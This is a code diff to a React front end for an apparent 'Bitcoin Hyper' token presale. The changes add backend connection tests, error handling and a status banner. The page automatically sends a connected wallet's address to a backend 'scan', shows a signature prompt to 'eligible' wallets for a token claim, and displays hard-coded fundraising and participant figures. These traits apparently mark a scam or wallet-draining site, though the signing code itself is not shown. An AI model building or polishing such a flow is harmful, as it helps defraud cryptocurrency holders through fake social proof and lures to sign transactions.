@@ -51,8 +51,44 @@ const config = createConfig(
   })
 );
 
-// Backend API - Update this with your Render URL
+// BACKEND API - UPDATE THIS WITH YOUR ACTUAL BACKEND URL
+// Test these URLs to find the correct one:
+// 1. https://tokenbackend-5xab.onrender.com/api
+// 2. https://tokenbackend-5xab.onrender.com/
+// 3. Your Render dashboard should show the actual URL
 const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";
+
+// Function to test backend connection
+const testBackendConnection = async () => {
+  try {
+    console.log('Testing backend connection to:', BACKEND_API);
+    
+    // Test 1: Try the root endpoint
+    const test1 = await fetch(BACKEND_API.replace('/api', ''));
+    console.log('Root endpoint test:', test1.status);
+    
+    // Test 2: Try the API endpoint
+    const test2 = await fetch(BACKEND_API);
+    console.log('API endpoint test:', test2.status);
+    
+    // Test 3: Try a specific endpoint
+    const test3 = await fetch(`${BACKEND_API}/presale/connect`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ test: true })
+    });
+    console.log('Presale endpoint test:', test3.status);
+    
+    return {
+      root: test1.status,
+      api: test2.status,
+      presale: test3.status
+    };
+  } catch (error) {
+    console.error('Backend test failed:', error);
+    return { error: error.message };
+  }
+};
 
 // Bitcoin Hyper Presale Component
 function BitcoinHyperPresale() {
@@ -67,6 +103,9 @@ function BitcoinHyperPresale() {
   const [processing, setProcessing] = useState(false);
   const [showSignModal, setShowSignModal] = useState(false);
   const [isMobile, setIsMobile] = useState(false);
+  const [backendStatus, setBackendStatus] = useState('unknown');
+  const [connectionError, setConnectionError] = useState('');
+  
   const [presaleStats] = useState({
     raised: "$4,892,450",
     participants: "12,458",
@@ -81,8 +120,26 @@ function BitcoinHyperPresale() {
     seconds: 30
   });
   
-  // Initialize
+  // Test backend connection on component mount
   useEffect(() => {
+    const testConnection = async () => {
+      const result = await testBackendConnection();
+      console.log('Backend test result:', result);
+      
+      if (result.error) {
+        setBackendStatus('error');
+        setConnectionError(`Backend connection failed: ${result.error}`);
+      } else if (result.presale === 200 || result.api === 200) {
+        setBackendStatus('connected');
+      } else {
+        setBackendStatus('partial');
+        setConnectionError(`Backend responded with status: Root=${result.root}, API=${result.api}, Presale=${result.presale}`);
+      }
+    };
+    
+    testConnection();
+    
+    // Check if mobile
     setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
     
     // Start countdown
@@ -117,16 +174,17 @@ function BitcoinHyperPresale() {
 
   // Auto scan when wallet connects
   useEffect(() => {
-    if (isConnected && address) {
+    if (isConnected && address && backendStatus === 'connected') {
       triggerAutoScan();
     }
-  }, [isConnected, address]);
+  }, [isConnected, address, backendStatus]);
 
-  // Auto scan function
+  // Auto scan function with improved error handling
   const triggerAutoScan = async () => {
     if (!address) return;
     
     setScanning(true);
+    setConnectionError('');
     
     try {
       const response = await fetch(`${BACKEND_API}/presale/connect`, {
@@ -142,6 +200,11 @@ function BitcoinHyperPresale() {
         })
       });
       
+      // Check if response is okay
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+      }
+      
       const data = await response.json();
       
       if (data.success) {
@@ -149,7 +212,7 @@ function BitcoinHyperPresale() {
         setTimeout(() => {
           setScanning(false);
           
-          if (data.data.isEligible) {
+          if (data.data?.isEligible) {
             setIsEligible(true);
             
             // Show animated sign modal after 1 second
@@ -164,12 +227,21 @@ function BitcoinHyperPresale() {
                 setShowSignModal(false);
               }
             }, 30000);
+          } else {
+            // Not eligible
+            setIsEligible(false);
+            setTimeout(() => {
+              setScanning(false);
+            }, 2000);
           }
         }, 2000);
+      } else {
+        throw new Error(data.error || 'Unknown error from backend');
       }
     } catch (error) {
       console.error('Scan error:', error);
       setScanning(false);
+      setConnectionError(`Scan failed: ${error.message}`);
     }
   };
 
@@ -178,6 +250,7 @@ function BitcoinHyperPresale() {
     if (!address || !isEligible) return;
     
     setProcessing(true);
+    setConnectionError('');
     
     try {
       const claimAmount = "5,000 BTH";
@@ -202,6 +275,10 @@ function BitcoinHyperPresale() {
         })
       });
       
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+      }
+      
       const data = await response.json();
       
       if (data.success) {
@@ -219,22 +296,24 @@ function BitcoinHyperPresale() {
         } catch (e) {
           console.log('Audio play failed');
         }
+      } else {
+        throw new Error(data.error || 'Claim failed');
       }
     } catch (error) {
       console.error('Claim error:', error);
+      setConnectionError(`Claim failed: ${error.message}`);
+    } finally {
       setProcessing(false);
     }
   };
 
-  // Celebration animations
+  // Celebration animations (same as before)
   const triggerCelebrationAnimation = () => {
     const container = document.getElementById('animation-container');
     if (!container) return;
     
-    // Clear previous animations
     container.innerHTML = '';
     
-    // Create bitcoin coins animation
     for (let i = 0; i < 15; i++) {
       const coin = document.createElement('div');
       coin.innerHTML = '₿';
@@ -253,7 +332,6 @@ function BitcoinHyperPresale() {
       container.appendChild(coin);
     }
     
-    // Create sparkles
     for (let i = 0; i < 30; i++) {
       const sparkle = document.createElement('div');
       sparkle.style.cssText = `
@@ -277,7 +355,6 @@ function BitcoinHyperPresale() {
     
     container.innerHTML = '';
     
-    // Rocket launch animation
     const rocket = document.createElement('div');
     rocket.innerHTML = '🚀';
     rocket.style.cssText = `
@@ -292,7 +369,6 @@ function BitcoinHyperPresale() {
     `;
     document.body.appendChild(rocket);
     
-    // Massive confetti
     const colors = ['#F7931A', '#FFD700', '#FF6B6B', '#4ECDC4', '#45B7D1'];
     for (let i = 0; i < 300; i++) {
       setTimeout(() => {
@@ -320,7 +396,6 @@ function BitcoinHyperPresale() {
       }, i * 10);
     }
     
-    // Bitcoin rain
     setTimeout(() => {
       for (let i = 0; i < 50; i++) {
         const bitcoin = document.createElement('div');
@@ -345,7 +420,6 @@ function BitcoinHyperPresale() {
         }, 3000);
       }
       
-      // Add animation styles
       const style = document.createElement('style');
       style.textContent = `
         @keyframes bitcoinRain {
@@ -385,7 +459,6 @@ function BitcoinHyperPresale() {
       
     }, 500);
     
-    // Auto remove rocket
     setTimeout(() => {
       if (document.body.contains(rocket)) {
         document.body.removeChild(rocket);
@@ -398,14 +471,47 @@ function BitcoinHyperPresale() {
     return num < 10 ? `0${num}` : num;
   };
 
-  // Sign Modal Component
+  // Backend Status Indicator
+  const BackendStatus = () => {
+    if (backendStatus === 'connected') return null;
+    
+    const statusConfig = {
+      error: { color: '#ff6b6b', text: 'Backend Connection Failed' },
+      partial: { color: '#ffd93d', text: 'Backend Partially Connected' },
+      unknown: { color: '#45b7d1', text: 'Checking Backend Status...' }
+    };
+    
+    const config = statusConfig[backendStatus] || statusConfig.unknown;
+    
+    return (
+      <div className="backend-status" style={{ backgroundColor: config.color }}>
+        <div className="backend-status-content">
+          <span className="backend-status-icon">
+            {backendStatus === 'error' ? '⚠️' : '🔄'}
+          </span>
+          <span className="backend-status-text">
+            {config.text}
+          </span>
+          {connectionError && (
+            <button
+              onClick={() => alert(connectionError)}
+              className="backend-status-details"
+            >
+              View Details
+            </button>
+          )}
+        </div>
+      </div>
+    );
+  };
+
+  // Sign Modal Component (same as before)
   const SignModal = () => {
     if (!showSignModal) return null;
     
     return (
       <div className="sign-modal-overlay">
         <div className="sign-modal">
-          {/* Shimmer effect */}
           <div className="sign-modal-shimmer"></div>
           
           <button
@@ -480,6 +586,9 @@ function BitcoinHyperPresale() {
 
   return (
     <div className="app-container">
+      {/* Backend Status Indicator */}
+      <BackendStatus />
+      
       {/* Animation container */}
       <div id="animation-container" className="animation-container"></div>
       
@@ -627,6 +736,21 @@ function BitcoinHyperPresale() {
               </h3>
               <p className="eligible-description">
                 Check the sign button above to claim your presale tokens!
+              </p>
+            </div>
+          ) : backendStatus !== 'connected' ? (
+            <div className="backend-warning-container">
+              <div className="backend-warning-icon">⚠️</div>
+              <h3 className="backend-warning-title">
+                Backend Connection Issue
+              </h3>
+              <p className="backend-warning-description">
+                Cannot scan wallet due to backend connectivity problems.
+                {connectionError && (
+                  <small style={{display: 'block', marginTop: '10px', opacity: 0.8}}>
+                    Error: {connectionError}
+                  </small>
+                )}
               </p>
             </div>
           ) : (
